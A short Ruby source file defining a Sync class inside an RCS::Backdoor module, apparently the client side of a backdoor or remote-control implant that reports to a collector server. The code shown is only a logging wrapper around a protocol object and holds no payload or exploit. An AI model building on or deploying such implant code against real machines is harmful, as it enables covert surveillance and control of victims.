#
# The sync object is responsible for the synchronization
# with the RCSCollector
#

# RCS::Common
require 'common/trace'

# System
require 'ostruct'

module RCS
module Backdoor
  
class Sync
  include Tracer
  attr_accessor :backdoor
  
  def initialize(protocol, backdoor)
    @protocol = Protocol.new(protocol, self)  
    @backdoor = backdoor
  end
  
  # for now the sync is a mere wrapper to protocol
  # in the future it could contain other actions
  def perform(host)
    trace :info, "Synching with " << host
    
    # setup the parameters
    @protocol.sync = self
    
    # execute the sync protocol
    @protocol.perform host
    
    trace :info, "Sync ended"
  end
  
end

end # Backdoor::
end # RCS::

if __FILE__ == $0
  # TODO Generated stub
end